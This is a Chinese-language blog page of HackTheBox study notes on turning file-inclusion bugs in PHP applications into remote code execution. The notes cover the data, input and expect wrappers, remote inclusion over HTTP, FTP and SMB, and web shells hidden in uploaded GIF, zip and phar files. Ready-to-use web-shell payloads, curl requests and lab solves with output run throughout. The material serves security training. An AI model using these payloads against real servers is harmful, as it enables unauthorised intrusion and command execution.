@@ -1,0 +1,576 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || File-inclusion:RCE</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>File-inclusion:RCE </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/15
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#03a9f4>
+                    base
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/practice" style=color:#00bcd4>
+                    practice
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/hackthebox" style=color:#ffa2c4>
+                    hackthebox
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h1><p>到目前为止，在本模块中，我们一直在利用文件包含漏洞，通过各种方法披露本地文件。从本节中，我们将开始学习如何使用文件包含漏洞在后端服务器上执行代码并获得对它们的控制。<br>我们可以使用许多方法来执行远程命令，每种方法都有特定的用例，因为它们取决于后端语言&#x2F;框架和易受攻击的函数的功能。获得对后端服务器控制的一种简单而常见的方法是枚举用户凭据和SSH密钥，然后使用它们通过SSH或任何其他远程会话登录到后端服务器。例如，我们可能会在config.php这样的文件中找到数据库密码，如果用户重复使用相同的密码，该密码可能会与用户的密码相匹配。或者，我们可以检查每个用户主目录中的.ssh目录，如果读取权限设置不正确，那么我们可以获取他们的私钥（id_rsa），并使用它将ssh连接到系统中。<br>除了这些琐碎的方法之外，还有一些方法可以直接通过易受攻击的函数实现远程代码执行，而不依赖于数据枚举或本地文件权限。在本节中，我们将从PHP web应用程序上的远程代码执行开始。我们将在上一节学习的基础上进行构建，并将利用不同的PHP包装器来获得远程代码执行。然后，在接下来的部分中，我们将学习其他方法来获得远程代码执行，这些方法也可以与PHP和其他语言一起使用。</p>
+<span id="more"></span>
+
+<h2 id="DATA"><a href="#DATA" class="headerlink" title="DATA"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.data.php">DATA</a></h2><p>数据包装器可用于包含外部数据，包括PHP代码。但是，只有在PHP配置中启用了（allow_url_include）设置时，才能使用数据包装器。因此，让我们首先通过LFI漏洞读取PHP配置文件来确认是否启用了此设置。</p>
+<p>为此，我们可以在Apache的（&#x2F;etc&#x2F;PHP&#x2F;X.Y&#x2F;apache2&#x2F;PHP.ini）或Nginx的（&#x2F;etc&#x2F;hp&#x2F;X.Y&#x2F;fpm&#x2F;PHP.ini）中包含PHP配置文件，其中X.Y是您的安装PHP版本。我们可以从最新的PHP版本开始，如果找不到配置文件，可以尝试早期版本。我们还将使用上一节中使用的base64过滤器，因为.ini文件与.php文件相似，应该进行编码以避免破坏。最后，我们将使用cURL或Burp而不是浏览器，因为输出字符串可能很长，我们应该能够正确地捕获它：</p>
+<pre><code>curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;
+</code></pre>
+<p>了解如何检查allow_url_include选项可能非常重要，因为该选项在默认情况下未启用，并且是其他几种LFI攻击所必需的，如使用输入包装器或任何RFI攻击，我们将在下面看到。启用此选项并不罕见，因为许多web应用程序都依赖它来正常运行，例如一些WordPress插件和主题。</p>
+<p>启用allow_url_include后，我们可以继续进行数据包装攻击。如前所述，数据包装器可用于包含外部数据，包括PHP代码。我们还可以通过text&#x2F;plain传递base64编码的字符串；base64，并且它能够解码它们并执行PHP代码。<br>因此，我们的第一步是对一个基本的PHP web shell进行base64编码，如下所示：</p>
+<pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+</code></pre>
+<p>现在，我们可以对base64字符串进行URL编码，然后使用data:&#x2F;&#x2F;text&#x2F;plain；base64， 。最后，我们可以使用&amp;cmd&#x3D;<COMMAND>将命令传递到web shell：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id
+</code></pre>
+<p>我们也可能使用cURL进行相同的攻击，如下所示：</p>
+<pre><code>curl -s &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#39; | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.php.php">Input</a></h2><p>与<code>data</code> wrapper类似，输入包装器可用于包含外部输入和执行PHP代码。它与数据包装器的区别在于，我们将输入作为POST请求的数据传递给输入wrapper。因此，易受攻击的参数必须接受POST请求才能使此攻击生效。最后，输入wrapper还依赖于allow_url_include设置，如前所述。</p>
+<p>为了重复我们之前的攻击，但使用<code>data</code> wrapper，我们可以向易受攻击的URL发送POST请求，并将我们的web shell添加为POST数据。要执行命令，我们会将其作为GET参数传递，就像我们在之前的攻击中所做的那样：</p>
+<pre><code>-s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>注意：要将我们的命令作为GET请求传递，我们需要易受攻击的函数也接受GET请求（即使用$_request）。如果它只接受POST请求，那么我们可以将命令直接放在PHP代码中，而不是动态web shell（例如&lt;\？PHP system（’id’）？&gt;）</p>
+<h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.expect.php">Expect</a></h2><p>最后，我们可以使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper,，它允许我们通过URL流直接运行命令。Expect的工作原理与我们之前使用的web shell非常相似，但不需要提供web shell，因为它是为执行命令而设计的。<br>然而，expect是一个外部wrapper，因此需要在后端服务器上手动安装和启用它，尽管一些web应用程序的核心功能依赖于它，所以我们可能会在特定情况下找到它。我们可以像前面使用allow_url_include一样确定它是否安装在后端服务器上，但我们会改为grep for expect，如果安装并启用了它，我们会得到以下结果：</p>
+<pre><code> echo &#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39; | base64 -d | grep expect
+extension=expect
+</code></pre>
+<p>正如我们所看到的，extension-configuration关键字用于启用expect模块，这意味着我们应该能够使用它通过LFI漏洞获得RCE。要使用expect模块，我们可以使用<code>expect://</code>wrapper，然后传递我们想要执行的命令，如下所示：</p>
+<pre><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>正如我们所看到的，通过expect模块执行命令相当简单，因为正如前面提到的，这个模块是为执行命令而设计的。Web攻击模块还涵盖了使用带有XXE漏洞的expect模块，因此，如果您对如何在此处使用它有很好的了解，则应该设置为将其与XXE一起使用。<br>这是最常见的三个PHP包装器，用于通过LFI漏洞直接执行系统命令。在接下来的章节中，我们还将介绍<code>phar</code>和<code>zip</code>wrapper，我们可以将其用于允许文件上传的web应用程序，以通过LFI漏洞获得远程执行。</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><pre><code>target:165.232.46.252:30054
+尝试在/使用其中一个PHPwrapper获取RCE
+</code></pre>
+<p>按照正常流程，应该要想办法知道服务器配置，但是这样的话必须要文件包含，甚至需要找到服务器的语言版本才能查看配置文件，很闭环。。但是一般而言，既然要测它是不是有包含漏洞，直接开始各种包含、伪协议测试好像也没差。。。这点挺让人无语的。</p>
+<p>这道题的话，随便用个伪协议就过了：</p>
+<pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>en.php es.php extension.php image.jpg index.php style.css
+</code></pre>
+<pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cd /;ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>37809e2f8952f06139011994726d9ef1.txt bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
+</code></pre>
+<p>那应该实在这个txt文件里面了</p>
+<pre><code>http://165.232.46.252:30054/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>HTB&#123;d!$46l3_r3m0t3_url_!nclud3&#125;
+</code></pre>
+<h1 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion">Remote File Inclusion (RFI)</a></h1><p>到目前为止，在本模块中，我们主要关注本地文件包含（LFI）。然而，在某些情况下，如果易受攻击的功能允许包含远程URL，我们也可以包含远程文件“远程文件包含（RFI）”。这有两个主要好处：<br>列举仅本地端口和web应用程序（即SSRF）<br>通过包含我们托管的恶意脚本来获得远程代码执行<br>在本节中，我们将介绍如何通过RFI漏洞获得远程代码执行。服务器端攻击模块涵盖了各种SSRF技术，这些技术也可能与RFI漏洞一起使用。</p>
+<p>此外，正如我们在上表中可能注意到的，一些函数确实允许包含远程URL，但不允许执行代码。在这种情况下，我们仍然可以利用该漏洞通过SSRF枚举本地端口和web应用程序。</p>
+<p>然而，这可能并不总是可靠的，因为即使启用了此设置，易受攻击的功能也可能不允许从一开始就包含远程URL。因此，确定LFI漏洞是否也容易受到RFI攻击的一种更可靠的方法是尝试包含一个URL，看看我们是否可以获取其内容。首先，我们应该始终从尝试包含本地URL开始，以确保我们的尝试不会被防火墙或其他安全措施阻止。所以，让我们使用(<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php)%E4%BD%9C%E4%B8%BA%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E7%9C%8B%E7%9C%8B%E5%AE%83%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%E5%9C%A8%E5%86%85%EF%BC%9A">http://127.0.0.1:80/index.php)作为我们的输入字符串，看看它是否包含在内：</a></p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php
+</code></pre>
+<p>如果index.php页面被包括在易受攻击的部分（即历史描述）中，该页面确实容易受到RFI的攻击，因为我们能够包括URL。此外，如果index.php页面没有作为源代码文本包含，而是作为php执行和呈现，因此易受攻击的函数也允许执行php，如果我们在机器上包含恶意的php脚本，这可能会允许我们执行代码。<br>我们还看到，我们能够指定端口80并在该端口上获取web应用程序。如果后端服务器托管任何其他本地web应用程序（例如端口8080），那么我们可以通过在其上应用SSRF技术通过RFI漏洞访问它们。</p>
+<p>注意：包含易受攻击的页面本身（即index.php）可能并不理想，因为这可能会导致递归包含循环并导致后端服务器的DoS。</p>
+<pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php
+</code></pre>
+<p>现在，我们所需要做的就是托管这个脚本，并通过RFI漏洞将其包含在内。在80或443这样的通用HTTP端口上侦听是个好主意，因为在易受攻击的web应用程序有防火墙阻止传出连接的情况下，这些端口可能会被列入白名单。此外，我们可以通过FTP服务或SMB服务托管脚本，我们将在下面看到。</p>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><pre><code>sudo python3 -m http.server &lt;LISTENING_PORT&gt;
+Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...
+</code></pre>
+<p>在本地启动一个服务器，但是需要内网穿透。</p>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>如前所述，我们还可以通过FTP协议托管我们的脚本。我们可以使用Python的pyftpdlib启动一个基本的FTP服务器，如下所示：</p>
+<pre><code> sudo python -m pyftpdlib -p 21
+</code></pre>
+<p>这在http端口被防火墙阻止或<code>http://</code>被WAF阻止的情况下也可能很有用。为了包含我们的脚本，我们可以重复前面的操作，但在URL中使用ftp:&#x2F;&#x2F;方案，如下所示：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id
+</code></pre>
+<p>同样的，一般情况下是需要内网穿透</p>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>如果易受攻击的web应用程序托管在Windows服务器上（我们可以从HTTP响应标头中的服务器版本中看出这一点），那么我们不需要启用allow_url_include设置来利用RFI，因为我们可以利用SMB协议来包含远程文件。这是因为Windows将远程SMB服务器上的文件视为普通文件，可以使用UNC路径直接引用这些文件。<br>我们可以使用Impacket的smbserver.py启动SMB服务器，默认情况下允许匿名身份验证，如下所示：</p>
+<pre><code>impacket-smbserver -smb2support share $(pwd)
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+<p>现在，我们可以通过使用UNC路径（例如\<our_IP>\share\shell.php）来包含我们的脚本，并像前面所做的那样用（&amp;cmd&#x3D;whoami）指定命令：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami
+</code></pre>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami
+</code></pre>
+<p>正如我们所看到的，这种攻击适用于包括我们的远程脚本，并且我们不需要启用任何非默认设置。然而，我们必须注意，如果我们在同一网络上，这种技术更有可能工作，因为根据Windows服务器配置，默认情况下可能会禁用通过互联网访问远程SMB服务器。</p>
+<p>补充一点impacket-smbserver：</p>
+<pre><code>impacket-smbserver &lt;共享名称&gt; &lt;共享路径&gt;
+</code></pre>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><pre><code>target:10.129.29.114
+攻击目标，利用RFI漏洞执行命令，然后在/中的某个目录下查找flag
+</code></pre>
+<p>kali：ip：10.10.15.22</p>
+<p>先看一下能不能使用url：</p>
+<pre><code>http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php
+</code></pre>
+<p>有页面，可以，启用FTP一个服务器：</p>
+<pre><code>impacket-smbserver -smb2support share ~
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+<p>包含shell脚本：</p>
+<pre><code>http://10.129.29.114/index.php?language=ftp://10.10.15.22/shell.php&amp;cmd=id
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Notice: Undefined variable: p2 in /var/www/html/index.php on line 48
+</code></pre>
+<p>到处see一see：</p>
+<pre><code>http://10.129.29.114/index.php?language=ftp://10.10.15.22/shell.php&amp;cmd=cd%20/;ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>bin boot dev etc exercise home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+Notice: Undefined variable: p2 in /var/www/html/index.php on line 48
+</code></pre>
+<p>这个exercise文件应该是用户自建的，see一see：</p>
+<pre><code>flag.txt
+
+Notice: Undefined variable: p2 in /var/www/html/index.php on line 48
+</code></pre>
+<p>好家伙，直接找到了</p>
+<p>当然了，如果文件实在没什么头绪，还是建议使用find、locate这类查找的命令</p>
+<h1 id="LFI-and-File-Uploads"><a href="#LFI-and-File-Uploads" class="headerlink" title="LFI and File Uploads"></a>LFI and File Uploads</h1><p>文件上传功能在大多数现代网络应用程序中无处不在，因为用户通常需要通过上传数据来配置他们的配置文件和网络应用程序的使用情况。对于攻击者来说，在后端服务器上存储文件的能力可能会扩展对许多漏洞的利用，例如文件包含漏洞。文件上传攻击模块涵盖了如何利用文件上传表单和功能的不同技术。然而，对于我们将在本节中讨论的攻击，我们不要求文件上传表单易受攻击，而只是允许我们上传文件。如果易受攻击的函数具有代码执行功能，那么无论文件扩展名或文件类型如何，如果我们包含它，我们上传的文件中的代码都将被执行。例如，我们可以上传一个图像文件（例如image.jpg），并在其中存储PHP web shell代码“而不是图像数据”，如果我们通过LFI漏洞将其包括在内，PHP代码将被执行，我们将进行远程代码执行。</p>
+<h2 id="Image-upload"><a href="#Image-upload" class="headerlink" title="Image upload"></a>Image upload</h2><p>图像上传在大多数现代网络应用程序中非常常见，因为如果上传功能被安全编码，上传图像被广泛认为是安全的。但是，如前所述，在这种情况下，漏洞不在文件上传表单中，而是在文件包含功能中。</p>
+<p>我们的第一步是创建一个恶意图像，其中包含一个看起来和工作方式都像图像的PHP web外壳代码。因此，我们将在文件名中使用允许的图像扩展名（例如，shell.gif），并且还应该在文件内容的开头包括图像字节（例如，GIF8），以防上传表单同时检查扩展名和内容类型。我们可以这样做：</p>
+<pre><code>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif
+</code></pre>
+<p>注意：在这种情况下，我们使用GIF图像，因为它的魔法字节很容易键入，因为它们是ASCII字符，而其他扩展的魔法字节是二进制的，我们需要对其进行URL编码。但是，此攻击适用于任何允许的图像或文件类型。文件上传攻击模块对文件类型攻击进行了更深入的研究，这里可以应用相同的逻辑。这里附一个PNG文件的数据结构解读：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397397536">PNG文件解读(2):PNG格式文件结构与数据结构解读—解码PNG数据 - 知乎 (zhihu.com)</a></p>
+<h2 id="上传的文件路径"><a href="#上传的文件路径" class="headerlink" title="上传的文件路径"></a>上传的文件路径</h2><p>一旦我们上传了我们的文件，我们所需要做的就是通过LFI漏洞将其包括在内。要包含上传的文件，我们需要知道上传文件的路径。在大多数情况下，尤其是对于图像，我们可以访问上传的文件，并从其URL获取其路径。在我们的情况下，如果我们在上传图像后检查源代码，我们可以获得其URL：</p>
+<pre><code>&lt;img src=&quot;/profile_images/shell.gif&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;
+</code></pre>
+<p>注意：正如我们所看到的，我们可以使用<code>/proile_images/shell.gif </code>作为文件路径。如果我们不知道文件上传到哪里，那么我们可以对上传目录进行模糊处理，然后对上传的文件进行模糊处理。尽管这可能并不总是有效的，因为一些web应用程序会正确地隐藏上传的文件。</p>
+<p>有了上传的文件路径，我们所需要做的就是将上传的文件包含在LFI易受攻击的函数中，然后执行PHP代码，如下所示：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id
+</code></pre>
+<h2 id="ZIP-Upload"><a href="#ZIP-Upload" class="headerlink" title="ZIP  Upload"></a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.compression.php">ZIP</a>  Upload</h2><p>如前所述，上述技术非常可靠，只要易受攻击的函数允许代码执行，就可以在大多数情况下和大多数web框架中使用。还有一些其他仅使用PHP的技术可以利用PHP包装来实现相同的目标。在上述技术不起作用的某些特定情况下，这些技术可能会变得很方便。<br>我们可以使用<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.compression.php">zip</a> wrapper 来执行PHP代码。但是，这个包装器在默认情况下没有启用，所以这个方法可能并不总是有效的。要做到这一点，我们可以从创建一个PHP web shell脚本开始，并将其压缩到一个zip档案（名为shell.jpg）中，如下所示：</p>
+<pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php
+</code></pre>
+<pre><code>zip &lt;压缩文件名.zip&gt; &lt;要压缩的文件或目录&gt;
+
+通过指定要压缩的文件或目录以及要创建的 ZIP 文件的名称，可以使用 zip 命令创建一个新的 ZIP 文件。
+</code></pre>
+<p>注意：尽管我们将我们的zip档案命名为（shell.jpg），但一些上传表单仍可能通过内容类型测试将我们的文件检测为zip档案，并禁止其上传，因此如果允许上传zip档案，则此攻击更有可能奏效。</p>
+<p>一旦我们上传了shell.jpg档案，我们就可以将其与zip包装器一起作为(zip:&#x2F;&#x2F;shell.jpg)，然后使用#shell.php（URL编码）引用其中的任何文件。最后，我们可以像对待&amp;cmd&#x3D;id一样执行命令，如下所示：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id
+</code></pre>
+<h2 id="Phar-Upload"><a href="#Phar-Upload" class="headerlink" title="Phar Upload"></a>Phar Upload</h2><p>最后，我们可以使用<code>phar://</code> wrapper来获得类似的结果。为此，我们将首先将以下PHP脚本写入<code>shell.PHP</code>文件：</p>
+<pre><code>&lt;?php
+$phar = new Phar(&#39;shell.phar&#39;);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(&#39;shell.txt&#39;, &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;);
+$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>这个脚本可以编译成一个phar文件，当被调用时，它会将一个web shell写入一个shell.txt子文件，我们可以与之交互。我们可以将它编译成一个phar文件，并将其重命名为shell.jpg，如下所示：</p>
+<pre><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg
+</code></pre>
+<p>现在，我们应该有一个名为shell.jpg的phar文件。一旦我们将其上传到web应用程序，我们可以简单地用phar:&#x2F;&#x2F;调用它并提供其URL路径，然后用&#x2F;shell.txt（URL编码）指定phar子文件，以获得我们用（&amp;cmd&#x3D;id）指定的命令的输出，如下所示：</p>
+<pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id
+</code></pre>
+<p>zip和phar包装器方法都应该被视为替代方法，以防第一种方法不起作用，因为我们讨论的第一种方法是这三种方法中最可靠的。</p>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><pre><code>target:159.65.60.16:30331
+</code></pre>
+<ul>
+<li>使用本节中涵盖的任何技术获得RCE</li>
+</ul>
+<p>先打开网站，找到文件上传页面，上传一下，看看地址：</p>
+<pre><code>&lt;img src=&#39;/profile_images/default.jpg&#39; class=&#39;profile-image&#39; id=&#39;profile-image&#39;&gt;
+</code></pre>
+<p>在<code>/profile_images/</code>这个目录。</p>
+<p>同时还看到：</p>
+<pre><code>&lt;input type=&quot;file&quot; name=&quot;uploadFile&quot; id=&quot;uploadFile&quot; onchange=&quot;checkFile(this)&quot; accept=&quot;.jpg,.jpeg,.png,.gif,.zip&quot;&gt;
+</code></pre>
+<p>那攻击面还挺广的，试一下这个不常见的zip方法：</p>
+<pre><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php
+  adding: shell.php (stored 0%)
+</code></pre>
+<p>然后上传成功后再找到文件包含漏洞的页面进行测试：</p>
+<pre><code>http://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=lshttp://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
+<pre><code>en.php es.php image.jpg index.php profile_images script.js settings.php style.css upload.php 
+</code></pre>
+<p>这里的<code>#</code>要进行url编码，不然没办法解析，这里的<code>#</code>应该是选择解压缩后需要读取的文件。</p>
+<pre><code>http://159.65.60.16:30331/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=cd%20/%20;ls
+</code></pre>
+<p>&#x3D;&#x3D;&gt;</p>
